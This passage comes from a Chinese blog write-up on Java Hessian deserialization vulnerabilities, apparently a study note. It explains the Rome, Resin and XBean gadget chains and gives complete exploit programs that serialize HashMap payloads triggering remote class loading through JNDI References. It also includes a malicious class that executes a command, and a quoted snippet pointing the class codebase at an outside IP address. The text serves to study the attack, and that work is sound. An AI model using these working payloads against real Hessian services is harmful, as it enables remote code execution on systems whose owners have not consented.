方法来获取对象中的字段，在老版本中应该是 <code>getFieldMap</code> 方法。依旧是判断了成员变量标识符，如果是 transient 和 static 字段则不会参与序列化反序列化流程。</p><p><img src="https://cdn.clown2024.cn/202410100024721.png" alt="image-20241010002444663"></p><p>这个地方对标识符进行了判断，如果为 transient 和 static 字段则不会参与序列化反序列化流程</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>前面的分析可以知道Hessian大部分是利用反射写入值，且过程并没有调用类的readObject方法，也没有触发getter&#x2F;setter方法，那么漏洞点在哪呢</p><p>漏洞点就在我们前面说过的对Map类型数据的处理上，<code>MapDeserializer#readMap</code> 对 Map 类型数据进行反序列化操作是会创建相应的 Map 对象，并将 Key 和 Value 分别反序列化后使用 put 方法写入数据。在没有指定 Map 的具体实现类时，将会默认使用 HashMap ，对于 SortedMap，将会使用 TreeMap。</p><p><img src="https://cdn.clown2024.cn/202410100032949.png" alt="image-20241010003247887"></p><p>那利用的方式其实就比较好联想了对于这两个类</p><p>HashMap在put的时候会调用hash方法，从而调用key.hashCode。</p><p><img src="https://cdn.clown2024.cn/202410100035334.png" alt="image-20241010003515291"></p><p>TreeMap 在 put 时，由于要进行排序，所以要对 key 进行比较操作，将会调用 compare 方法，会调用 key 的 compareTo 方法。</p><p><img src="https://cdn.clown2024.cn/202410100035008.png" alt="image-20241010003554961"></p><p>这么一看Hessian反序列化利用被限制得比较窄</p><ul><li>kick-off chain 起始方法只能为 hashCode&#x2F;equals&#x2F;compareTo 方法；</li><li>利用链中调用的成员变量不能为 transient 修饰；</li><li>所有的调用不依赖类中 readObject 的逻辑，也不依赖 getter&#x2F;setter 的逻辑。</li></ul><h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><p>在<a href="https://github.com/mbechler/marshalsec">marshalsec</a>项目里有关于该反序列化的实现，有下面五条链</p><ul><li>Rome</li><li>XBean</li><li>Resin</li><li>SpringPartiallyComparableAdvisorHolder</li><li>SpringAbstractBeanFactoryPointcutAdvisor</li></ul><h2 id="rome链"><a href="#Rome链" class="headerlink" title="Rome链"></a>Rome链</h2><p>Rome链的核心是他的ToStringBean的toString方法，他可以调用传入类的所有无参getter方法，这里就可以打JdbcRowSetImpl的链子触发jndi</p><p>然后ToStringBean外面包一层EqualsBean和HashMap即可</p><p>触发链子如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>JdbcRowSetImpl#getDatabaseMetaData<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410101102136.png" alt="image-20241010110223027"></p><p><img src="https://cdn.clown2024.cn/202410101102006.png" alt="image-20241010110235946"></p><h3 id="二次反序列化"><a href="#二次反序列化" class="headerlink" title="二次反序列化"></a>二次反序列化</h3><p>上面的JNDI利用需要出网，所以可以借助SignedObject#getObject来打二次反序列化</p><p>链子改成这样就行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#hashCode<br>EqualsBean#hashCode<br>EqualsBean#beanHashCode<br>ToStringBean#toString<br>SignedObject#getObject<br></code></pre></td></tr></table></figure><p>然后封装一个想要的链子进去就行了</p><h2 id="resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h2><p>该链子最终效果打的是远程类加载</p><p>参考文章：<a href="https://blog.csdn.net/uuzeray/article/details/136727060">https://blog.csdn.net/uuzeray/article/details/136727060</a></p><p>Resin是一个轻量级的、高性能的开源Java应用服务器。它是由Caucho Technology开发的，旨在提供可靠的Web应用程序和服务的运行环境，和Tomcat一样是个服务器；他常和Hessian产生联系</p><p>测试时可以导入下面的包</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.caucho<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>resin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.64<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Resin 这条利用链的入口点实际上是 HashMap 对比两个对象时触发的 <code>com.sun.org.apache.xpath.internal.objects.XString</code> 的 <code>equals</code> 方法。</p><p>XString的利用在ROME的HotSwappableTargetSource利用链有用到过</p><p><img src="https://cdn.clown2024.cn/202410102001525.png" alt="image-20241010200147467"></p><p>在这里我们利用的是com.caucho.naming.QName的toString方法</p><p><img src="https://cdn.clown2024.cn/202410102003734.png" alt="image-20241010200338680"></p><p>这里的逻辑比较简单，但是QName是什么，我们得先了解一下，才能知道他这样为什么可以触发</p><p>看一下他的描述</p><p><img src="https://cdn.clown2024.cn/202410102030167.png" alt="image-20241010203001097"></p><p>这里描述意思是代表一个已解析的JNDI名称</p><p>看一下他的构造方法</p><p><img src="https://cdn.clown2024.cn/202410102032765.png" alt="image-20241010203211713"></p><p>QName对象的功能是用于表示一个JNDI限定名（qualified name），通过传入的Context对象以及两个字符串参数（first和rest），QName对象可以将这些信息组合起来形成一个完整的限定名。</p><p>Context接口的描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">This interface represents a naming context, which consists of a set of name-to-object bindings. It contains methods for examining and updating these bindings.<br></code></pre></td></tr></table></figure><p>此接口表示一个命名上下文，它由一组名称到对象的绑定组成。它包含检查和更新这些绑定的方法。也就是jndi的相关操作</p><p>然后我们要用到的Context的实现类是ContinuationContext</p><p>构造方法</p><p><img src="https://cdn.clown2024.cn/202410102039546.png" alt="image-20241010203937489"></p><p>CannotProceedException是javax.naming异常体系中的一种异常，通常在本地加载类失败时使用。它的作用是对无法继续进行操作的异常情况进行处理。</p><p>处理的关键在Reference类，文章给了一个对CannotProceedException类的构造</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://124.222.136.33:1337/&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;calc&quot;</span>;<br> <br><span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br> <br><span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br><span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br></code></pre></td></tr></table></figure><p>Reference构造方法</p><p><img src="https://cdn.clown2024.cn/202410102106681.png" alt="image-20241010210638627"></p><p>现在回到前面QName的toString方法，我们会调用ContinuationContext#composeName方法</p><p><img src="https://cdn.clown2024.cn/202410102113650.png" alt="image-20241010211324591"></p><p>然后调用到getTargetContext方法，这里的ctx.composeName方法可以忽略，不在利用链中</p><p><img src="https://cdn.clown2024.cn/202410102114406.png" alt="image-20241010211417350"></p><p>然后我们需要进入到NamingManager.getContext方法里面，不过还需要满足前面的两个条件</p><p>contCtx &#x3D;&#x3D; null，在构造中本身就不设置，所以不需要考虑<br>cpe.getResolvedObj()返回不为null(其实返回的就是我们上面给CannotProceedException构造的恶意Reference)，所以也不会为null</p><p>这里传的是cpe.getResolvedObj，也就是我们构造的Reference类</p><p>继续跟进</p><p><img src="https://cdn.clown2024.cn/202410102122102.png" alt="image-20241010212200426"></p><p>然后漏洞的触发点就在NamingManager#getObjectInstance这个方法里面，从名字看就是要对我们传入的Reference类进行实例化</p><p>有关该方法的描述</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Creates an instance of an object for the specified object and environment.<br>If an object factory builder has been installed, it is used to create a factory for creating the object. Otherwise, the following rules are used to create the object:<br>If refInfo is a Reference or Referenceable containing a factory class name, use the named factory to create the object. Return refInfo if the factory cannot be created<br>翻译一下：<br>为指定的对象和环境创建对象的实例。<br>如果已安装对象工厂生成器，则使用它来创建用于创建对象的工厂。否则，将使用以下规则创建对象：<br>如果refInfo是包含工厂类名的Reference或Referenceable，请使用命名的工厂创建对象。如果无法创建工厂，则返回refInfo。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102142943.png" alt="image-20241010214214868"></p><p>然后关键类方法是getObjectFactoryFromReference</p><p><img src="https://cdn.clown2024.cn/202410102157527.png" alt="image-20241010215719459"></p><p>这首先会从本地加载类，肯定加载不到，然后就从codebase加载，也就是我们的远程地址那里，最后及进行类的实例化，然后触发漏洞</p><p>然后就是hashMap要触发equals还要构造哈希相等，有点懒得再分析了，直接copy文章的exp小改一下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">// 创建ContinuationContext对象</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;javax.naming.spi.ContinuationContext&quot;</span>);<br>        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);<br>        <span class="hljs-comment">// 构造方法为protected修饰</span><br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Context</span> <span class="hljs-variable">continuationContext</span> <span class="hljs-operator">=</span> (Context) constructor.newInstance(cannotProceedException, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;());<br><br><br>        <span class="hljs-comment">// 创建QName</span><br>        <span class="hljs-type">QName</span> <span class="hljs-variable">qName</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">QName</span>(continuationContext, <span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(qName.hashCode());<br>        <span class="hljs-comment">// 创建Xtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// 创建HashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(qName, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;ResinHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>恶意类TestRef</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestRef</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TestRef</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102208703.png" alt="image-20241010220704531"></p><h2 id="xbean"><a href="#XBean" class="headerlink" title="XBean"></a>XBean</h2><p>这条链和Resin差不多</p><p>导入下面依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-naming<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>链子</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">HashMap#equals--&gt;XString#equals--&gt;ContextUtil.ReadOnlyBinding#toString--&gt;Binding#toString--&gt;ContextUtil.ReadOnlyBinding#getObject--&gt;ContextUtil#resolve--&gt;NamingManager#getObjectInstance<br></code></pre></td></tr></table></figure><p>看一下关键的地方</p><p>ContextUtil.ReadOnlyBinding#toString本身没有toString所以就走到父类Binding#toString</p><p><img src="https://cdn.clown2024.cn/202410102223585.png" alt="image-20241010222327507"></p><p>ContextUtil.ReadOnlyBinding#getObject</p><p><img src="https://cdn.clown2024.cn/202410102224965.png" alt="image-20241010222415889"></p><p>ContextUtil#resolve</p><p><img src="https://cdn.clown2024.cn/202410102227755.png" alt="image-20241010222504369"></p><p>然后后面的就和前面一样了</p><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.caucho.naming.QName;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.ContextUtil;<br><span class="hljs-keyword">import</span> org.apache.xbean.naming.context.WritableContext;<br><br><span class="hljs-keyword">import</span> javax.naming.CannotProceedException;<br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">XBeanUse</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refAddr</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">refClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;TestRef&quot;</span>;<br><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(refClassName, refClassName, refAddr);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">cannotProceedException</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.naming.CannotProceedException&quot;</span>).getDeclaredConstructor().newInstance();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;javax.naming.NamingException&quot;</span>;<br>        setFiled(classname, cannotProceedException, <span class="hljs-string">&quot;resolvedObj&quot;</span>, ref);<br><br>        <span class="hljs-comment">//创建ContextUtil.ReadOnlyBinding对象</span><br>        ContextUtil.<span class="hljs-type">ReadOnlyBinding</span> <span class="hljs-variable">readOnlyBinding</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContextUtil</span>.ReadOnlyBinding(<span class="hljs-string">&quot;clown&quot;</span>,ref,<span class="hljs-keyword">new</span> <span class="hljs-title class_">WritableContext</span>());<span class="hljs-comment">//放入ref</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> unhash(readOnlyBinding.hashCode());<br>        <span class="hljs-comment">// 创建Xtring</span><br>        <span class="hljs-type">XString</span> <span class="hljs-variable">xString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XString</span>(str);<br><br>        <span class="hljs-comment">// 创建HashMap</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(readOnlyBinding, <span class="hljs-string">&quot;111&quot;</span>);<br>        hashMap.put(xString, <span class="hljs-string">&quot;222&quot;</span>);<br><br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">hessian2Output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(fileOutputStream);<br>        <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>        serializerFactory.setAllowNonSerializable(<span class="hljs-literal">true</span>);<br>        hessian2Output.setSerializerFactory(serializerFactory);<br>        hessian2Output.writeObject(hashMap);<br>        hessian2Output.close();<br><br>        <span class="hljs-comment">// 反序列化</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;XBeanHessian.bin&quot;</span>);<br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">hessian2Input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(fileInputStream);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HashMap) hessian2Input.readObject();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(String classname, Object o, String fieldname, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class&lt;?&gt; aClass = Class.forName(classname);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(o, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">unhash</span> <span class="hljs-params">( <span class="hljs-type">int</span> hash )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> hash;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">answer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">if</span> ( target &lt; <span class="hljs-number">0</span> ) &#123;<br>            <span class="hljs-comment">// String with hash of Integer.MIN_VALUE, 0x80000000</span><br>            answer.append(<span class="hljs-string">&quot;\\u0915\\u0009\\u001e\\u000c\\u0002&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ( target == Integer.MIN_VALUE )<br>                <span class="hljs-keyword">return</span> answer.toString();<br>            <span class="hljs-comment">// Find target without sign bit set</span><br>            target = target &amp; Integer.MAX_VALUE;<br>        &#125;<br><br>        unhash0(answer, target);<br>        <span class="hljs-keyword">return</span> answer.toString();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unhash0</span> <span class="hljs-params">( StringBuilder partial, <span class="hljs-type">int</span> target )</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">div</span> <span class="hljs-operator">=</span> target / <span class="hljs-number">31</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">rem</span> <span class="hljs-operator">=</span> target % <span class="hljs-number">31</span>;<br><br>        <span class="hljs-keyword">if</span> ( div &lt;= Character.MAX_VALUE ) &#123;<br>            <span class="hljs-keyword">if</span> ( div != <span class="hljs-number">0</span> )<br>                partial.append((<span class="hljs-type">char</span>) div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            unhash0(partial, div);<br>            partial.append((<span class="hljs-type">char</span>) rem);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410102245522.png" alt="image-20241010224522400"></p><blockquote><p>选择Context的实现类的时候有些可能报错在执行他的getEnvironment方法的时候，需要设置一些变量之类的，这里的WritableContext类就可以直接创建就能用</p></blockquote><h2 id="其他链"><a href="#其他链" class="headerlink" title="其他链"></a>其他链</h2><p>还有一些其他的链子比如Spring AOP之类的就不分析了，懒了主要是（</p><p>看一下师傅的文章就好，到时遇到再研究。</p><p>这篇文章有相关exp：<a href="https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&u_asig=1a0c384b17285714178144818e003d">https://xz.aliyun.com/t/13599?u_atoken=dee6998cc1d8cc5521fac10e0bd2ff43&amp;u_asig=1a0c384b17285714178144818e003d</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;来学一下Hessian反序列化，主要参考su18师傅的文章：&lt;/p&gt;
&lt;h1 id=&quot;hessian简介&quot;&gt;&lt;a href=&quot;#Hessian简介&quot; class=&quot;headerlink&quot; title=&quot;Hessian简介&quot;&gt;&lt;/a&gt;Hessian简介&lt;/h1&gt;&lt;p&gt;直接抄s</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>反射修改变量</title>
